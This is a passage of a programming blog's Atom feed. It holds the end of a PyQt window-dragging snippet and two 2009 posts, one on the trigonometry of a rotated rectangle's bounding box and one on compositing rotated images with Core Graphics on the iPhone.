            &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;globalPos&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;drag_position&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
    &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;mousePressEvent&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;button&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;QtCore&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Qt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;LeftButton&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;drag_position&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;globalPos&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pos&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="n"&gt;event&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;We just get the click position when the mouse button is pressed, work out the offset from the
top left corner of the&amp;nbsp;&lt;code&gt;window&lt;/code&gt;&amp;nbsp;(this is what the move function uses) and then when
the mouse moves, we move the&amp;nbsp;&lt;cite&gt;window&lt;/cite&gt;&amp;nbsp;with it.&lt;/p&gt;
&lt;p&gt;That's it really. Pretty simple once you know how. Now go and enjoy the rest of that coffee.&lt;/p&gt;
</summary></entry><entry><title>Bounding box of rotated image</title><link href="http://unlogic.co.uk/2009/12/04/bounding-box-of-rotated-image/" rel="alternate"></link><updated>2009-12-04T17:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2009-12-04:2009/12/04/bounding-box-of-rotated-image/</id><summary type="html">&lt;p&gt;In a previous post I mentioned about finding the width and height of the bounding box of a rotated rectangle, in this post I will explain the math in more detail. Given a 2D rectangle and an arbitrary angle of rotation, how do we work out the new bounding box of the rectangle?&lt;/p&gt;
&lt;p&gt;&amp;lt;!--more--&amp;gt;&lt;/p&gt;
&lt;p&gt;I'll use the image below to help illustrate:&lt;/p&gt;
&lt;img alt="" src="&amp;quot;/images/content/bbox.jpg&amp;quot;" /&gt;
&lt;p&gt;The blue rectangle is our original shape and the red one our (obviously) newly rotated rectangle. α is the angle we’ve rotated by in degrees Let’s think back to maths class and try to remember our trigonometry. In order to find the length of a given side in a right angled triangle we take one of the known sides and an angle and apply sin, cos or tan accordingly.&lt;/p&gt;
&lt;p&gt;Our aim here is to find h1, h2, w1, and w2 in order to get&lt;/p&gt;
&lt;blockquote&gt;
h' = h1 + h2
w' = w1 + w2&lt;/blockquote&gt;
&lt;p&gt;Where h’ and w’ are the new width and height of the bounding box. Let’s start with w1 and h1, referring back to the top right triangle in the diagram. We know the length of the hypotenuse so we need to use cos for w1 (adjacent) and then for h1 (opposite) we need to use sin&lt;/p&gt;
&lt;blockquote&gt;
w1 = h * sin(a)
h1 = h * cos(a)&lt;/blockquote&gt;
&lt;p&gt;Half way there. Next we find w2 and h2 in a similar way&lt;/p&gt;
&lt;blockquote&gt;
w2 = w * cos(a)
h2 = w * sin(a)&lt;/blockquote&gt;
&lt;p&gt;Now all we need to do is add h1 and h2 together to get h’ and w1 to w1 to get w’. In code that is&lt;/p&gt;
&lt;pre class="code c literal-block"&gt;
&lt;span class="kt"&gt;float&lt;/span&gt; &lt;span class="n"&gt;h_dash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fabs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cos&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;alpha&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fabs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;alpha&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;span class="kt"&gt;float&lt;/span&gt; &lt;span class="n"&gt;w_dash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fabs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cos&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;alpha&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fabs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;alpha&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The more astute of you may have noticed that this is slightly different to what I posted in my previous article. That’s because I noticed I can do away with beta and use just the angle of rotation. In terms of execution time this means very little as beta is obtained once by subtraction alpha from 90, but in a neatness sense it’s an improvement.&lt;/p&gt;
</summary></entry><entry><title>Compositing images on an iPhone with Core Graphics</title><link href="http://unlogic.co.uk/2009/04/12/compositing-images-on-an-iphone-with-core-graphics/" rel="alternate"></link><updated>2009-04-12T15:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2009-04-12:2009/04/12/compositing-images-on-an-iphone-with-core-graphics/</id><summary type="html">&lt;p&gt;How do you take two images, one with rotation and scale applied, and compose the two together in memory and save the result to the device? We make use of core graphics and a little bit of math.&lt;/p&gt;
&lt;p&gt;&amp;lt;!--more--&amp;gt;&lt;/p&gt;
&lt;p&gt;To set the scene properly here’s what we have: we have an image that’s been scaled and rotated and positioned on screen, over which we would like to place an image that will fill the screen and always be the same size, this is the overlay. Our overlay is 320×480 and positioned centrally in the display and contains transparency to let the background show through. Both images are PNG files.&lt;/p&gt;
&lt;p&gt;So what we want to do is create two frames, one for the background image and one for the overlay. Then we create a graphics context for the background image, rotate it, draw our image into it, position it on screen,&amp;nbsp;and then composite the overlay on top of that. Once that’s done we grab the image (now composited) from the graphics context and write it to the device.&lt;/p&gt;
&lt;p&gt;Ready? Then let’s set up a frame for both the background image and the overlay&lt;/p&gt;
&lt;pre class="code objective-c literal-block"&gt;
&lt;span class="c1"&gt;// Assume that overlay and userImage are our UIImages
// overlay and background images respectively
// Overlay frame
&lt;/span&gt;&lt;span class="bp"&gt;CGRect&lt;/span&gt; &lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;origin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CGPointMake&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CGSizeMake&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;320&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;480&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="c1"&gt;// background frame
// Scale is the factor the image is scaled by (float)
&lt;/span&gt;&lt;span class="bp"&gt;CGRect&lt;/span&gt; &lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;userImage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt; &lt;span class="o"&gt;*=&lt;/span&gt; &lt;span class="n"&gt;scale&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt; &lt;span class="o"&gt;*=&lt;/span&gt; &lt;span class="n"&gt;scale&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;In order to draw our image rotated we actually need to rotate the context and then draw our image into it. We also need to know the size of the rectangle that contains the rotated context. We’ll use some simple trig to work that out. We need this new size in order to correctly position the background, as core graphics uses the top left corner to place the context and after the rotation the top left corner has moved somewhat.&lt;/p&gt;
&lt;pre class="code objective-c literal-block"&gt;
&lt;span class="c1"&gt;// Get the size of the background frame (unrotated)
&lt;/span&gt;&lt;span class="bp"&gt;CGSize&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// Work out the bounding box for the rotated image
&lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kt"&gt;float&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="c1"&gt;// Using the trig we need to know 90deg - the actual rotation angle
&lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt; &lt;span class="n"&gt;beta&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DEGREES_TO_RADIANS&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;90.0&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rotation&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

&lt;span class="c1"&gt;// Do the trig for the new size
&lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt; &lt;span class="n"&gt;h1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fabs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;beta&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fabs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cos&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;beta&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;span class="kt"&gt;float&lt;/span&gt; &lt;span class="n"&gt;w1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fabs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;beta&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fabs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cos&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;beta&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;span class="c1"&gt;// CG works in radians - Using a macro to do the work
&lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt; &lt;span class="n"&gt;angle&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DEGREES_TO_RADIANS&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rotation&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="bp"&gt;CGSize&lt;/span&gt; &lt;span class="n"&gt;tempFrame&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;tempFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;tempFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;w1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// Rotation Context starts here
// draw the image into it
&lt;/span&gt;&lt;span class="n"&gt;UIGraphicsBeginImageContext&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tempFrame&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;CGContextRef&lt;/span&gt; &lt;span class="n"&gt;ctx&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;UIGraphicsGetCurrentContext&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="c1"&gt;// Rotate around center
&lt;/span&gt;&lt;span class="n"&gt;CGContextTranslateCTM&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tempFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tempFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;CGContextRotateCTM&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;angle&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;CGContextTranslateCTM&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ctx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;tempFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;tempFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="c1"&gt;// Origin is this for some reason. One day I'll figure it out
&lt;/span&gt;&lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;origin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CGPointMake&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;w1&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                             &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;h1&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="c1"&gt;// Draw it
&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;userImage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="nl"&gt;drawInRect&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="c1"&gt;// Get it
&lt;/span&gt;&lt;span class="bp"&gt;UIImage&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="k"&gt;copy&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;UIGraphicsGetImageFromCurrentImageContext&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;UIGraphicsEndImageContext&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;You will notice I'm a bit bewildered as to why the origin of the background frame is what it is. I figured this out by experimenting a bit, but haven't yet got round to working out the exact science/reason behind it. If you know why, I'd appreciate you leaving a comment here, or emailing me, so I can update this page.&lt;/p&gt;
&lt;p&gt;Home stretch now, we're almost done. Just draw the overlay and then nab the contents of the context and write it to the device&lt;/p&gt;
&lt;pre class="code objective-c literal-block"&gt;
&lt;span class="c1"&gt;// On to the comp
&lt;/span&gt;&lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;w1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="c1"&gt;// position is where the original image was placed on screen
// in this case the coordinate for the position was the center of the image
// hence the adjustments
&lt;/span&gt;&lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;origin&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CGPointMake&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;position&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;width&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
                            &lt;span class="mi"&gt;480&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;height&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="n"&gt;UIGraphicsBeginImageContext&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="c1"&gt;// draw the background and overlay
&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="k"&gt;copy&lt;/span&gt; &lt;span class="nl"&gt;drawInRect&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;bgFrame&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;overlay&lt;/span&gt; &lt;span class="nl"&gt;drawInRect&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;overlay&lt;/span&gt; &lt;span class="k"&gt;release&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

&lt;span class="c1"&gt;// Get and save the comp image
&lt;/span&gt;&lt;span class="bp"&gt;UIImage&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;newImage&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;UIGraphicsGetImageFromCurrentImageContext&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;UIGraphicsEndImageContext&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="n"&gt;UIImageWriteToSavedPhotosAlbum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;newImage&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;nil&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;nil&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;And there we go. You can adjust the :code:&lt;tt class="docutils literal"&gt;UIImageWriteToSavedPhotosAlbum&lt;/tt&gt; if you need the callback, but I omitted it in this case.&lt;/p&gt;
</summary></entry></feed>